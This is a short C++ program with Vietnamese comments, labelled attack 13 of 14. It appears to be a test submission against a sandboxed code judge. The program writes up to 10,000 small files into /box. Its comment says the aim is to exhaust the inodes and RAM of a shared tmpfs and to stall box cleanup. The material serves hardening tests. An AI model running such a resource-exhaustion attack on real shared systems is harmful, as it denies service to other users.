// Tấn công 13/14 — tạo 10.000 file trong /box.
// Không phải để thoát sandbox mà để làm cạn inode/RAM của tmpfs dùng chung, và để
// làm bước dọn box chậm tới mức mất slot.
#include <cstdio>
int main() {
    int created = 0;
    for (int i = 0; i < 10000; ++i) {
        char name[64];
        snprintf(name, sizeof name, "f%05d.dat", i);
        FILE* f = fopen(name, "w");
        if (!f) break;
        for (int k = 0; k < 64; ++k) fwrite("0123456789ABCDEF", 1, 16, f);
        fclose(f);
        ++created;
    }
    printf("CREATED:%d\n", created);
    return 0;
}
